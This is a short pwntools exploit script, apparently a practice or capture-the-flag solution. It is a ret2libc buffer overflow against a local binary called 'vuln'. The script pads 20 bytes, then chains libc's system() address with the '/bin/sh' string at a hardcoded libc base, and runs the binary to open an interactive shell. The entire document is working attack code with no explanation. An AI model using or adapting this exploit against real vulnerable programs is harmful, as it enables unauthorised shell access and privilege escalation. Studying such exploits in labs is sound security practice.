from pwn import *

elf = ELF("./vuln", checksec=False)
libc = ELF("/lib32/libc.so.6", checksec=False)
context.binary = elf

offset = 20

sh_offset = next(libc.search(b"/bin/sh"))
system_offset = libc.symbols["system"]
setuid_offset = libc.symbols["setuid"]

libc_base = 0xf7c00000

payload = b""
payload += p32(libc_base + system_offset)
payload += b"BEEF"
payload += p32(libc_base + sh_offset)

exploit = b"A" * offset + payload

process = process(["./vuln",exploit])

process.interactive()

